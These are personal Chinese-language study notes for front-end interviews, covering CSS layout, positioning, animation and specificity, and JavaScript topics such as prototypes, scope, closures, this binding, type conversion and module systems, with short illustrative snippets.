### 盒模型
通过box-sizing设置
* content-box 标准模型
    * 宽高 = content ，不包括边框和padding
* border-box  IE模型
    * 宽高= content+ 边框border + padding

### JS获取宽高
* dom.offsetHeight 最佳
* dom.style.height 只能获取内联样式
* dom.getBoundingClientRect().width/height 根据元素在视窗中的位置来获取宽高的 
* window.getComputedStyle(dom).offsetWidth/height 获得最后显示的css样式
* dom.currentStyle.width/height  页面渲染完成后的结果，就是说不管是哪种方式设置的样式，都能获取到。但这种方式只有**IE浏览器**支持

### 各种宽高
* offsetWidth 相对于父元素偏移量 = content+padding2+border2
* clientWidth 客户区大小 content + padding*2
* scrollWidth 滚动大小 包括滚动条

### 窗口大小
* window.innnerHeight 视口 看不同浏览器
* window.outerHeight 浏览器大小  看不同浏览器
* document.documentElement.clientHeight 视口 标准模式
* docunment.body.clientHeight 视口 混杂模式

### BFC 
块级格式化上下文，是一个独立的渲染区域，让处于 BFC 内部的元素与外部的元素相互隔离，使内外元素的定位不会相互影响。
[](https://www.cnblogs.com/lhb25/p/inside-block-formatting-ontext.html)
[](https://zhuanlan.zhihu.com/p/25321647)

### 层叠上下文
[](https://juejin.im/post/5b876f86518825431079ddd6)
[](https://juejin.im/post/5b876f86518825431079ddd6#heading-8)

例子：
```
<div >
    <div>

    </div>
</div>
```

层叠上下文的background/border < z-index小于0 < block < float < inline < z-index=0,auto < z-index大于0

如果产生了层叠上下文 那么比较其背景与子元素
没有的话就是普通元素 block

### 居中布局

[flex](https://www.zhangxinxu.com/wordpress/2018/10/display-flex-css3-css/)


.parent {
    display: flex;
    justify-content: center;
}

.parent {
    display: flex;
    align-items: center;
}


* 水平居中

    * 行内元素: text-align: center
    * 块级元素: margin: 0 auto
    * absolute + transform
    * flex + justify-content: center


* 垂直居中

    * line-height: height
    * absolute + transform
    * flex + align-items: center
    * table `<table> <tr> <td>12 </td> </tr> </table>`



* 水平垂直居中

    * absolute + transform
    * flex + justify-content + align-items
    * fixed margin:auto left:0 right:0 right:0 bottom：0


### 选择器优先级

!important > 内联样式 > id > class(属性选择器[]、伪类 :) > 标签(伪元素) > 通配选择器 > 继承 > 默认

后定义的优先级较高

选择器优先级
优先级是由 A 、B、C、D 的值来决定的，其中它们的值计算规则如下： 
1. 如果存在内联样式，那么 A = 1, 否则 A = 0; 
2. B 的值等于 ID选择器 出现的次数;
3. C 的值等于 类选择器 和 属性选择器 和 伪类(:hover) 出现的总次数; 
4. D 的值等于 标签选择器 和 伪元素 出现的总次数 。 
 如果上面优先级相同, 则写在后面的会覆盖前面的

> !important 相当于 1,0,0,0,0
> 通配选择器 相当于 0,0,0,0
> #selector[id] 属性选择器 + id选择器
在比较时，先比较A，再一次往后比较B，C，D
（1,0,0,0 > 0,99,99,99）

[css选择器参考](./选择器.md)

### display：none visibility=0的区别
* display:none 是真的在页面上消失，不占用空间
* visibility=0 是不见了，但还是占了空间

### position
* static 
* absolute  元素相对于最近的非 static 定位祖先元素的偏移，来确定元素位置。如果没有就是相对于body
* relative 相对自己原来的位置
* fixed 相对窗口的绝对定位定位
    * top bottom left right 是相对于最外边距的距离。（content + padding + border + margin）
### 浮动清除 （去除浮动影响，防止父级高度塌陷）
```css
<div class="outer">
  <div class="inner">1</div>
  <div class="inner">2</div>
  <div class="inner">3</div>
</div>

.outer::after{
    content: "";
    clear: both;
    display: block;    
}
```

* 通过增加尾元素清除浮动 :after / <br> : clear: both
    * clear:both 左右两侧均不能出现浮动元素

(::after 是css3提出的 和 :after相同 ，都是伪元素，作为已选中元素的最后一个子元素。为了兼容性 建议使用:after)
```
#clear{
  clear: both;
}

<div class="outer">
  <div class="inner">1</div>
  <div class="inner">2</div>
  <div class="inner">3</div>
  <div id="clear"></div>
</div>



```

* 创建父级 BFC 

```
.outer{
    overflow:hidden;
}
```
* 父级设置高度


### \<link\> 与 @import 的区别
* link功能较多，可以定义 RSS，定义 Rel 等作用，而@import只能用于加载 css
`<link rel="stylesheet" href="****.css" type="text/css">
@import "***.css"`
* 当解析到link时，页面会同步加载所引的 css，而@import所引用的 css 会等到页面加载完才被加载
* @import需要 IE5 以上才能使用
* link可以使用 js 动态引入，@import不行

### CSS预处理器(Sass/Less/Postcss)
* Less
* Sass
* postCSS

[less](https://juejin.im/post/5a2bc28f6fb9a044fe464b19)

### css动画
* transition 
    * transition-property: 产生动画效果的属性
    * transition-duration: 动画时间
    * transition-timing-function: 曲线 [设置运动曲线](http://cubic-bezier.com/#.17,.67,.83,.67)
    * transition-delay: 延迟 用于设计动画发生的顺序

transition需要明确知道，开始状态和结束状态的具体数值，才能计算出中间状态

#### transition的优点在于简单易用，但是它有几个很大的局限。
* transition需要事件触发，所以没法在网页加载时自动发生。
* transition是一次性的，不能重复发生，除非一再触发。
* transition只能定义开始状态和结束状态，不能定义中间状态，也就是说只有两个状态。

常用钩子: transitionend

#### animation
* animation
   * animation-name: 动画名称，对应@keyframes
    * 动画属性
        * translate 
        * scale 
        * rotate 旋转
        * skew 倾斜转换
        * opacity
        * color
   * animation-duration: 间隔
   * animation-timing-function: 
        * 曲线 cubic-bezier()
        * steps(number,position) 让动画不连续
            * number 动画分成几段
            * position ： start （从下一个阶段开始） end （从初始状态开始）
            [例子](./transition.html)
   * animation-delay: 延迟
   * animation-iteration-count: 次数
        * infinite: 循环动画
   * animation-direction: 方向
        * alternate: 交替播放
        * reverse ：反向播放
        * alternate-reverse 
   * animation-fill-mode: 静止模式
        * forwards: 停止时，保留最后一帧
        * backwards: 停止时，回到第一帧
        * both: 同时运用 forwards / backwards
    * animation-play-state 没有鼠标没有悬停时，动画状态是暂停；一旦悬停，动画状态改为继续播放

    ```
    div {
        animation: spin 1s linear infinite;
        animation-play-state: paused;
    }

    div:hover {
        animation-play-state: running;
    }
    ```

```
.my-boat{
    animation :1s run;
}

@keyframe run{
    0% { background: #c00; }
    50% { background: orange; }
    100% { background: yellowgreen; }
}
```
### 手机端不同设备的适配
#### @media
通过@media来获取设备的各种属性，根据设备属性的条件来应用不同的CSS

例：1px边框的适配
```css
@media  (-webkit-min-device-pixel-ratio: 1){
        .c{
            transform: scaleY(0.5);
        }
    }
```

#### \<meta\> + rem 

* `name = 'viewport'`, 它提供有关视口初始大小的提示，仅供移动设备使用
* content
    * width	一个正整数或者字符串 device-width	以pixels（像素）为单位， 定义viewport（视口）的宽度。
    * height	一个正整数或者字符串 device-height	以pixels（像素）为单位， 定义viewport（视口）的高度。
    * initial-scale	一个0.0 到10.0之间的正数	定义设备宽度（纵向模式下的设备宽度或横向模式下的设备高度）与视口大小之间的缩放比率。
    * maximum-scale	一个0.0 到10.0之间的正数	定义缩放的最大值；它必须大于或等于minimum-scale的值，不然会导致不确定的行为发生。
    * minimum-scale	一个0.0 到10.0之间的正数	定义缩放的最小值；它必须小于或等于maximum-scale的值，不然会导致不确定的行为发生。
    * user-scalable	一个布尔值（yes 或者no）	如果设置为 no，用户将不能放大或缩小网页。默认值为 yes。

#### rem 
根据根元素（即html）的`font-size`来设置大小，比如html的字体大小设置为`16px`，那么`2rem = 32px`。

这里区分一下**em**，em是根据父元素的字体大小来设置的

### 实现
1. 通过meta来进行缩放
2. 设置html的字体大小，后面的大小单位全都使用rem

```html
<meta name="viewport" content="initial-scale = 1,maxinum-scale = 1,minimum-scale=1,user-scalable=no">
<script>  
            
    var viewport = document.querySelector("meta[name=viewport]");  
              //下面是根据设备像素设置viewport  
    if (window.devicePixelRatio == 1) {  
        viewport.setAttribute('content', 'width=device-width,initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no');  
    }  
     if (window.devicePixelRatio == 2) {  
       viewport.setAttribute('content', 'width=device-width,initial-scale=0.5, maximum-scale=0.5, minimum-scale=0.5, user-scalable=no');  
     }          
    var docEl = document.documentElement;  
    var fontsize = 10 * (docEl.clientWidth / 320) + 'px';  
    docEl.style.fontSize = fontsize;   
                
 </script>
```

#

### 原型链
[原型/原型链/创建/继承](./js继承.md)
* 原型链是由原型对象组成，每个对象都有 __proto__ 属性，指向了创建该对象的构造函数的原型，__proto__ 将对象连接起来组成了原型链。是一个用来实现继承和共享属性的有限的对象链。


    * 属性查找机制: 当查找对象的属性时，如果实例对象自身不存在该属性，则沿着原型链往上一级查找，找到时则输出，不存在时，则继续沿着原型链往上一级查找，直至最顶级的原型对象Object.prototype，如还是没找到，则输出undefined；


    * 属性修改机制: 只会修改实例对象本身的属性，如果不存在，则进行添加该属性，如果需要修改原型的属性时，则可以用: b.prototype.x = 2；但是这样会造成所有继承于该对象的实例的属性发生改变。




### 执行环境(执行上下文) EC  

**以下内容进行了更新，[具体参考](./执行环境_作用域链.md)**

#### 分类
* 全局执行环境 
    * 最外围的执行环境 全局执行环境 window对象
* 函数执行环境
    * 每个函数都有自己的执行环境
* eval执行环境 可以把调用上下文作为第二个参数传递给 eval


#### 变量对象 VO
* 每一个执行环境都有一个与之相关联的变量对象
* 其中保存着环境中所定义的 变量 和 函数

#### 活动对象 AO
* 变量对象被激活成为活动对象


#### this指向
函数运行时所在的环境
[原理上解释this指向 看底下评论](https://github.com/mqyqingfeng/Blog/issues/7) 还没看懂

[简单解释](http://www.ruanyifeng.com/blog/2018/06/javascript-this.html)

由于 JS 的设计原理: 在函数中，可以引用运行环境中的变量。因此就需要一个机制来让我们可以在函数体内部获取当前的运行环境，这便是this。
因此要明白 this 指向，其实就是要搞清楚 函数的运行环境，说人话就是，谁调用了函数。例如:

* obj.fn()，便是 obj 调用了函数，既函数中的 this === obj
* fn()，这里可以看成 window.fn()，因此 this === window

但这种机制并不完全能满足我们的业务需求，因此提供了三种方式可以手动修改 this 的指向:

* call: fn.call(target, 1, 2)
* apply: fn.apply(target, [1, 2])
* bind: fn.bind(target,1,2) 返回新函数 其中this指向target

例：
```js
function getUrl() {
    console.log(this.document.URL);
}

var pseudoWindow = {
    document: {
        URL: "I'm fake URL"
    },

    getUrl1: getUrl,

    getUrl2: function (callback) {
        callback();
        
        this.func = callback;
        this.func();
    }
};

getUrl();
pseudoWindow.getUrl1();
pseudoWindow.getUrl2(getUrl);
```

1. `getUrl()`相当于`window.getUrl`
2. `pseudoWindow.getUrl1() `其中this指向了`pseudoWindow`
3. `pseudoWindow.getUrl2(getUrl)`中
    * 对于`callback()`,调用函数生成了新的执行上下文，因为变量 `callback` 没有绑定到任何上下文，因此它相当于一个自由变量，它的上下文就指向了 `window` 对象
    * `this.func()`;调用函数生成了新的执行上下文，其中this指向`pseudoWindow`

### 作用域
上下文中声明的 变量和声明的作用范围
* 全局作用域 不带有声明关键字的变量，JS 会默认帮你声明一个全局变量
* 块级作用域(ES6) **javascrip没有块级作用域**
    * 用let声明 const （es6） 是必须有一个 { } 包裹：
    * let、const 没有变量提升且在同一个作用域不能重复定义（var声明的变量 也不能再用let、const重复声明）
* 函数作用域
* [词法作用域](https://github.com/mqyqingfeng/Blog/issues/3) 当我们要使用声明的变量时：JS引擎总会从最近的一个域，向外层域查找；
* 动态作用域 动态作用域，作用域是基于调用栈的，而不是代码中的作用域嵌套；
    * js是词法作用域 除了this引用

```js
for(let i = 0; i < 5; i++) {
    setTimeout(function() {
      console.log(i);
    }, 200);
};
//for (let x...)的循环在每次迭代时都为x创建新的绑定 相当于下面的例子,并且产生了闭包
var a = [];
{ var k;
    for (k = 0; k < 10; k++) {
      let i = k; //注意这里，每次循环都会创建一个新的i变量
      a[i] = function () {
        console.log(i);
      };
    }
}
```
**设置循环变量的那部分是一个父作用域，而循环体内部是一个单独的子作用域**。


上面代码中，变量i是let声明的，当前的i只在本轮循环有效，所以每一次循环的i其实都是一个新的变量，所以最后输出的是6。你可能会问，如果每一轮循环的变量i都是重新声明的，那它怎么知道上一轮循环的值，从而计算出本轮循环的值？这是因为 JavaScript 引擎内部会记住上一轮循环的值，初始化本轮的变量i时，就在上一轮循环的基础上进行计算。for循环还有一个特别之处，就是设置循环变量的那部分是一个父作用域，而循环体内部是一个单独的子作用域


#### 作用域链
执行上下文中包含作用域链。指向变量对象的指针列表
当代码在**一个环境中**执行时，会创建变量对象的**一个作用域链**，变量对象激活了变成活动对象
* [[ scope ]] 指向父级变量对象和作用域链
* 自身活动变量

例：
```js
var x = 10;

function a() { console.log(x); }

function b () { var x = 5; a(); }

b();    //10

var x =10;
function b(){
    var x = 5;
   (function (){
    console.log(x);
   })()
}
b();    //5

```
* 函数声明
    * 生成变量对象
    * 函数中的 \[\[ scope \]\] 保存所有上层对象的变量对象（所有父变量对象的层级链）
* 函数执行
    * 生成执行环境 （包括活动对象和作用域链）
        * 作用域链 = 当前活动对象 +  [[ scope ]]
        * 变量对象 激活 为活动对象

>作用域链的非自己部分在函数对象被建立（函数声明、函数表达式）的时候建立，而不需要等到执行

>作用域链的前面部分是静态的，所有函数共享同一个链，当函数执行时，建立一个自己当次执行的作用域，然后把这个作用域与前面共享的链关联起来

#### 代码执行过程:

* 创建 全局上下文 (global EC)
* 全局执行上下文 (caller) 逐行 自上而下 执行。遇到函数时，函数执行上下文 (callee) 被* push到执行栈顶层
* 函数执行上下文被激活，成为 active EC, 开始执行函数中的代码，caller 被挂起
* 函数执行完后，callee 被pop移除出执行栈，控制权交还全局上下文 (caller)，继续执行
* 执行到最后，执行环境栈中只有全局执行上下文，等到应用程序结束才会销毁




#### 声明提前: 
* this，arguments
* 形参
* 函数
    * 一个声明在函数体内都是可见的, 函数优先于变量
    * 匿名函数 赋值式声明定义，`var a =function(){}` 声明和定义不会提前
    * 非赋值非匿名式声明定义，`function a(){}` 声明和定义都会提前
    * 非匿名自执行函数，函数变量 为 只读 状态，无法修改 ？？？
    ```js
    let foo = function() { console.log(1) };
    (function foo() {
    foo = 10  // 由于foo在函数中只为可读，因此赋值无效
    console.log(foo)
    }())    
    // 结果打印：  ƒ foo() { foo = 10 ; console.log(foo) }
    ```
* 变量
    * var 变量的声明会提前 **赋值不会提前**
    * let，const声明的变量不会提前。let，const声明的变量不能在声明之前被使用，在作用域里定义赋值之前的部分会对该变量形成一个“暂时性死区”，也就是认为该变量不存在，也不可使用。在死区内使用该变量就会报错——即，后两个题目都会报错

* 优先级 this,arguments > 形参 > 函数 > 变量
       
例：
```js
var a = 1;
{
    consloe.log(a); //报错  ReferenceError
    let a ;
}


function testOrder(arg) {
    console.log(arg); // arg是形参，不会被重新定义
    console.log(a); // 因为函数声明比变量声明优先级高，所以这里a是函数
    var arg = 'hello'; // var arg;变量声明被忽略， arg = 'hello'被执行
    var a = 10; // var a;被忽视; a = 10被执行，a变成number
    function a() {
        console.log('fun');
    } // 被提升到作用域顶部
    console.log(a); // 输出10
    console.log(arg); // 输出hello
}; 
testOrder('hi');
/* 输出：
hi 
function a() {
        console.log('fun');
    }
10 
hello 
*/
```
### 函数

* 函数声明  声明提前
* 函数表达式 不会声明提前

#### arguments
arguments是一个类数组，并不是真正的数组

arguments.callee 指向正在执行的函数

转化为数组的方法：
```js
Array.prototype.slice.apply(arguments);
```
#### 匿名函数
匿名函数在执行过程中的this一般指向window

### 闭包
[闭包实现原理](https://www.zhihu.com/question/36393048)

**定义：有权访问另一个函数作用域中的变量的函数。**

闭包属于一种特殊的作用域，称为 静态作用域。它的定义可以理解为: 父函数被销毁 的情况下，返回出的子函数的[[scope]]中仍然保留着父级的变量对象和作用域链，因此可以继续访问到父级的变量对象，**除了this和arguments**这样的函数称为闭包。


多个子函数的\[\[scope\]\]都是同时指向父级，是完全共享的。因此当父级的变量对象被修改时，所有子函数都受到影响。

* 为了避免这种情况
    * 变量可以通过 函数参数的形式 传入，避免使用默认的\[\[scope\]\]向上查找 
        * (function(msg){
            return function(){console.log(msg);}
        })(i)
    * 使用setTimeout包裹，通过第三个参数传入
        * 第三个参数及以后的参数都可以作为func函数的参数
    
    * 使用 块级作用域，让变量成为自己上下文的属性，避免共享
        for(let i;i<3;i++)
```js
function setData(){
    var data = [];
    for(var i=0;i<3;i++){
        data[i] = (function(i){
            return function(){
                 console.log(i);
            }
        })(i);             
    }
    return data;
}
var data = setData();
data[1]();

for (var i = 0; i < 3; i++) {
  setTimeout((msg)=>{
    data[msg] = function(){
        console.log(msg);
    }
  },0,i)
}
```

> (function(){})() function外面的括号是将函数声明转化为函数表达式，所以才可以立即执行
    
#### 模仿块级作用域
```js
 (function(){
     //这里是块级作用域
 })()
 ```

### 私有变量
#### 每个实例维护自己的私有变量方法和特权方法和变量 
```js
function People(name){
    var money = 1000;   //私有变量和方法
    var pay = function(){

    };

    this.setMoney = function(x){ //特权方法和变量
        money = x;
    }
    this.payMoney = function(x){
        money = money - x;
        pay();
    }
    this.name = name;
}
var nire = new People('nire');

```

#### 多个实例共享私有变量和方法 以及特权方法
```js
(function People(){
    var money = 1000;   //私有变量和方法
    var pay = function(){
    };

    x = function(name){ 
        this.name = name;
    };
    x.prototype.setMoney = function(x){ //特权方法
        money = x;
    }
    x.prototype.getMoney(){
        return money;
    }
})()
var nire = new x('nire');
```

#### 模块模式 （单例）
返回的对象都是Object实例
```js
function People(){
    var money;

    return {
        name:'nire',
        getMoney:function(){
            return money;
        },
        setMoney:function(x){
            money = x;
        }
    }
}
var nire = People();
```

#### 增强的模块模式
设置返回对象的类型
```js
function People(name){
    this.name = name;
}

function single(){
    var money;

    var nire = new People('nire');
    nire.getMoney = function(){
            return money;
        },
    nire.setMoney = function(x){
            money = x;
        }

    return nire;
}
var nire = single();
```

 ### script 引入方式
 * html 静态`<script src="..." type="text/javascript">`引入 一般放在\<body>里的最后面
 * js 动态插入\<script>
 
 ```js
 function loadScript(url){
            var script = document.createElement('script');
            script.type = 'text/javascript';
            script.src = url;
            document.body.appendChild(script);
        }
loadScript('test.js');

function loadJsCode(code){
    var script = document.createElement('script');
    script.type = 'text/javascript';
    //for Chrome Firefox Opera Safari
    script.appendChild(document.createTextNode(code));
    //for IE
    //script.text = code;
    document.body.appendChild(script);
}
loadJsCode('alert(2)');

 ```
 #### 加载
 * `<script defer="defer">`:延迟加载，元素解析完成后执行,但是 script.js 的执行要在所有元素解析完成之后，DOMContentLoaded 事件触发之前完成
 * `<script async>`: 异步加载，但执行时会阻塞元素渲染，下载时是并发的，下载完后立即执行
 
 没有这两个标签 浏览器会在遇到js代码就立即执行，“立即”指的是在渲染该 script 标签之下的文档元素之前，也就是说不等待后续载入的文档元素，读到就加载并执行。

两者都会并行下载，不会影响页面的解析 defer会在元素渲染完之后执行 ，async下载完后立即执行

###  对象的拷贝

#### 普通的一个个复制属性
**for..in 会遍历当前对象以及原型链上的可枚举属性**
```
for(key in obj){     
    newobj[key] = obj[key];
}
```
* objCopy 对象具有一个新的 Object.prototype方法，这与 mainObj 对象的原型方法不同，这不是我们想要的。我们需要精确的拷贝原始对象。
* 属性描述符不能被复制。值为 false 的 “可写(writable)” 描述符在 objCopy 对象中为 true 。
* 上面的代码只复制了 mainObj 的可枚举属性。
* 如果原始对象中的一个属性本身就是一个对象，那么副本和原始对象之间将共享这个对象，从而使其各自的属性指向同一个对象。

#### 浅拷贝
* Object.assigh(目标对象，源对象..) 返回目标对象`var x = Objext.assign({},y)`
    * Object.assign() 方法用于将从一个或多个源对象中的所有可枚举的属性值复制到目标对象
    * 可以用于复制对象的方法
    * 原型链上的属性和不可枚举的属性不能复制  
    * 属性的值为对象 依旧只是引用
* 展开运算符 ...
    * 对象展开运算符让你可以通过展开运算符 (...) , 以更加简洁的形式将一个对象的可枚举属性拷贝至另一个对象
    * 对象字面量的展开操作符能将源对象中的可枚举的属性复制到目标对象上

```
let obj = {
  one: 1,
  two: 2,
}
 
let newObj = { ...z };
 
var x =[1,2,3];
var y = [...x];
```

#### 深拷贝
* 使用 JSON.parse(JSON.stringify(object)); 
    * 具有循环引用的对象时，报错
    * 当值为函数、undefined、或symbol时，无法拷贝
* 递归进行逐一赋值

### 原型和实例的关系
* instanceof 原型链中出现过的**构造函数** 返回true
* isPrototypeOf(实例) 原型链中出现的**原型** 返回true

### new运算符的执行过程
* 生成新对象
* 链接到原型 新对象.`_proto_` = 对象.prototype 

> 或者`Object.setProtoTypeOf(newobj,constructor.prototype)`
* 绑定this 指向新对象 var result = constructor.call(newobj);
*  result是否是对象 ? result ： 新对象 (null不会被当作对象，虽然`typeOf null === 'Object'`)

```js
    function constructor(){
        return new Object();
    }
    var obj = new Object();
   // Object.setPrototypeOf(obj,constructor.prototype) ;
    obj.__proto__ = constructor.prototype;
    var result = constructor.apply(obj,arr);
    return result是否是对象 ? result ： obj 

```

### 代码复用 
* 函数封装
* 继承
* extends继承（es6）  class A extends B
* 复制extend  
    * 使用jQuery的$.extend({},a) 浅拷贝
    * $.extend(true,{},a); 深复制
    * Undersource  _.extend()
 
* 混入mixin 一种模式  
    * 如果一个对象需要使用其他多个对象已经定义的"功能"的时候，我们就可以使用mixins复用代码
    * 一个对象的属性拷贝到另一个对象上面去
* 借用apply/call

（for-of 遍历数组值）

### 类型转换 
大家都知道 JS 中在使用运算符号或者对比符时，会自带隐式转换，规则如下:

* -、*、/、% ：一律转换成数值后计算
* +：

    * 数字 + 字符串 = 字符串， 运算顺序是从左到右
    * 数字 + 对象， 优先调用对象的valueOf -> toString
    * 数字 + boolean/null -> 数字
    * 数字 + undefined -> NaN
* [1].toString() === '1'
* {}.toString() === '[object object]'
* NaN !== NaN 、+undefined 为 NaN

* number
* boolean
* string
* undefined
* null
* Symbol

### 类型检查 
* typeof  obj      （number boolean object function string undefined）
    * NaN 的数据类型是 number
    * 数组(Array)的数据类型是 object
    * 日期(Date)的数据类型为 object
    *  **null 的数据类型是 object**  String(null) 来判断
    * 未定义变量的数据类型为 undefined
* obj instanceof XXX（Array Date RegExp Object 原型链上有）
* constructor 返回构造函数
* Object.prototype.toString.call(obj) 返回[object XXX] 来判断

```js
let class2type = {}
'Array Date RegExp Object Error'.split(' ').forEach(e => class2type[ '[object ' + e + ']' ] = e.toLowerCase()) 

function type(obj) {
    if (obj == null) return String(obj)
    return typeof obj === 'object' ? class2type[ Object.prototype.toString.call(obj) ] || 'object' : typeof obj
}
```

### 类型比较

#### valueOf()
* Date ->   数字 距离初始时间过去的毫秒数
* 其他 ->   自身

#### toString()
* Number ->     '123'
* Boolean ->    'true'|'false'
* Array ->      '1,2,3'
* RegExp ->     '/123/'
* Date ->       'Wed Oct 11 2017 08:00:00 GMT+0800 (中国标准时间)'
* function ->   'function(){ return 1;}'
* Object ->     '[object Object]' 调用原型上的toString

#### 强制转换
调用Number() String() Boolean()

#### 隐式转换
* +，==   String Number
* *，/，- 只会转换成Number


* === 不会隐式类型转换
* == 会进行隐式类型转换，两个被比较的值转换为相同类型

在 == 比较的过程中
* 类型相同时，直接比较 
    * NaN == NaN false
    * null == null true
    * undefined == undefined true
    * **null == undefined  true**
    * **null 和 undefined 不能转换成其他值**
    * 两个对象，则比较是否指向同一个对象
    * **如果是两个引用类型比较，则比较他们的地址是否相同**
* 不同类型，进行隐式转换 预期什么类型的值
    * 自动转化为Boolean
    * 自动转化为Number
    * 自动转化为String 



例子：
```js
[] == ![]
{} == false
if([])
[1] == [1]
```

**三种隐式转换**
* ToPrimary
* ToNumber
* toString

#### ToPrimary 转化为基本类型
* 如果已经是基本类型，则直接返回
* Date 先调用**toString**,如果不是基本类型，再调用**valueOf**
* 其他类型  先调用**valueOf**,如果不是基本类型，再调用**toStirng**

#### ToNumber
    
* 调用ToPrimary(obj,Number);
* 再调用ToNumber
* 转换规则
    * undefined ->  NaN
    * null ->       0
    * '123' ->      123
    * 'd12' ->      NaN
    * boolean ->    0|1

#### ToString

* 调用ToPrimary(obj,String);
* 再调用ToNumber
* 转换规则
    * undefined ->  "undefined"
    * null ->       "null"
    * boolean ->    "true"|"false"
    * 123 ->        "123"

### 箭头函数 与 普通函数
* 箭头函数在定义时直接绑定其内部this为其上下文this (箭头函数根本没有自己的this，导致内部的this指向了外层代码的this，这个指向在定义时就已经确定而不会在调用时指向其执行环境的（变量）对象。)
* 箭头函数本身内部**没有this**，所以不能当作构造函数使，也没有原型
* 没有arguments，super，new.target，都会指向外层的对应变量

例1：
```js
var handler = {
  id: '123456',

  init: function() {
    document.addEventListener('click',
      event => this.doSomething(event.type), false);
  },

  doSomething: function(type) {
    console.log('Handling ' + type  + ' for ' + this.id);
  }
};

handler.init();
```
在调用init()时`this.doSomething`中的`this`绑定在了`handler`上。

**回调函数中的this引用当前元素**，本题中如果不用箭头函数，那么在执行时，`this.doSomething`中的`this`指向**document**

例2：

```js
const cat = {
  lives: 9,
  jumps: () => {
    this.lives--;
  }
}
cat.jumps();
```

```js
var button = document.getElementById('press');
button.addEventListener('click', () => {
  this.classList.toggle('on');
});

document.addEventListener('click', function() {
  setTimeout(function() {
    console.log(this) //  setTimeout是window对象下的一个方法  
  })
}, false)
//window
```

**setTimeout是window对象下的一个方法**
this都绑定了全局环境window
```js
var button = document.getElementById('press');
button.addEventListener('click', function() {
  this.classList.toggle('on');
});

var x = {
    name :'x',
    runFun(fun){
        console.log(this); //x
        fun();
    }
}

x.runFun(function(){console.log(this)}); //fun中this指向window


```
this指向button

例3：
```js
// ES6
function foo() {
  setTimeout(() => {
    console.log('id:', this.id);
  }, 100);
}

// ES5
function foo() {
  var _this = this;

  setTimeout(function () {
    console.log('id:', _this.id);
  }, 100);
}
```
ES5中实现箭头函数，通过that保存当前的this值（闭包）

如果不使用箭头函数，setTimeout回调函数的this指向window。

#### 箭头函数的作用域

```js
// 常规写法
var greeting = () => {let now = new Date(); return ("Good" + ((now.getHours() > 17) ? " evening." : " day."));}
greeting();          //"Good day."
console.log(now);    // ReferenceError: now is not defined 标准的let作用域

// 参数括号内定义的变量是局部变量（默认参数）
var greeting = (now=new Date()) => "Good" + (now.getHours() > 17 ? " evening." : " day.");
greeting();          //"Good day."
console.log(now);    // ReferenceError: now is not defined

// 对比：函数体内{}不使用var定义的变量是全局变量
var greeting = () => {now = new Date(); return ("Good" + ((now.getHours() > 17) ? " evening." : " day."));}
greeting();           //"Good day."
console.log(now);     // Fri Dec 22 2017 10:01:00 GMT+0800 (中国标准时间)

// 对比：函数体内{} 用var定义的变量是局部变量
var greeting = () => {var now = new Date(); return ("Good" + ((now.getHours() > 17) ? " evening." : " day."));}
greeting(); //"Good day."
console.log(now);    // ReferenceError: now is not defined
```
### addEventListener 回调函数的this
this的值是触发事件的元素的引用

当使用 addEventListener() 为一个元素注册事件的时候，句柄里的 this 值是该元素的引用。其与传递给句柄的 event 参数的 **currentTarget**（不是current属性） 属性的值一样。
```js
var button = document.getElementById('press');
button.addEventListener('click', function() {
 console.log(this);
});
// button

var button = document.getElementById('press');
button.addEventListener('click', () => {
 console.log(this);
});
// window
```

如果一个事件的属性( 例如. onClick)是指定在一个HTML的元素上的，则这个属性中的JavaScript语句实际上会被包裹在一个处理函数中，在这个处理函数中使用this的效果和使用addEventListener来绑定事件的效果是一样的； this的出现代表了元素的引用。注意到在一个函数里this调用的的效果和标准规则里面是一样的。

```js
<button onclick="alert(this.tagName.toLowerCase());">
  Show this
</button>
// button
<button onclick="alert((function() { return this; })());">
  Show inner this
</button>
//window
```
###  setTimeout 回调函数的this
```js
var o = {
    delay(){
        setTimeout(function(){
            console.log(this)
        },1000)
    }
}
//window

var o = {
    delay(){
        setTimeout(()=>{
            console.log(this)
        },1000)
    }
}
//{delay:f}
```

### forEach 中的 this
如果给 forEach() 传递了 thisArg 参数，当调用时，它将被传给 callback 函数，作为它的 this 值。否则，将会传入 undefined 作为它的 this 值。


### 模块化
* ES6 ：export import 值是动态绑定的 
    * 静态化 先于模块内其他语句执行，命令具有提升效果
    * export输出文件内部变量、函数、类 export {a,b as B,c}; import {a,B,c} from ' '
    * export default  为模块指定默认输出， 一个模块只能有一个默认输。本质上，export default就是输出一个叫做default的变量或方法 
        * export default a; import a from ' '
    * import  命令具有提升效果
        * import * from "" 模块的整体加载，加载文件中全部的export 
    * import() 函数 动态加载 返回一个 Promise 对象
        * 加载模块成功以后，这个模块会作为一个对象，当作then方法的参数
    例如：
```
//输出单个变量
var name = nirean;
export {name}

//输出一组变量
var name = nirean;
bar age = 22;
function getHabby(){

};
export {name , age, geyHabby};

//as 重命名
export {name as myname};
import myname from ''
// circle.js输出两个函数 import * 整体加载
 
export function area(radius) {
  return Math.PI * radius * radius;
}

export function circumference(radius) {
  return 2 * Math.PI * radius;
}

import * as circle from './circle';

console.log('圆面积：' + circle.area(4));
console.log('圆周长：' + circle.circumference(14));

// export default 不需要{ }
export default getName;
import getName from '...';

// export default 为模块指定默认输出
export default function(){};
import getName from '...';
```

* NodeJS中的commonJS ：**require exports module.exports**
    * CommonJS规范加载模块是同步的，也就是说，只有加载完成，才能执行后面的操作 不适合浏览器
    * require()用来引入外部模块； 
        * 读入并执行一个JavaScript文件，然后返回该模块的exports对象
        * 第一次加载某个模块时，Node会缓存该模块。以后再加载该模块，就直接从缓存取出该模块的module.exports属性
    * exports对象用于导出当前模块的方法或变量，唯一的导出口；
    * module.exports nodeJS仅仅为了方便，用了一个变量exports直接指向了module.exports了
    * module对象就代表模块本身。

* AMD (require.js) 异步加载模块
    * 通过define方法，将代码定义为模块；通过require方法，实现代码的模块加载

```js
define(['module1','module2'],function(m1,m2){
    ……
    return {
        //返回接口
    }
})

require(['foo','bar'],function(foo,bar){
    ……
})
```

```js
module.exports.x = x;  var y = require(""); y.x
module.exports = x; var y = require(""); y
module.exports = {x:x}; var y = require(""); y.x
//ES6 解构赋值
var {x} = require(''); 
```
### require与import的区别
* require支持 动态导入（地址中包含变量），import 不支持，正在提案 (babel 下可支持) ->import()
* require是 同步 导入，import属于 异步 导入
* require是 值拷贝，导出值变化不会影响导入值；import指向 内存地址，导入值会随导出值而变化


### 同步 异步
* 同步 
    * 如果在函数返回的时候，调用者就能够得到预期结果
    * 如果函数是同步的，即使调用函数执行的任务比较耗时，也会一直等待直到得到预期结果。
* 异步
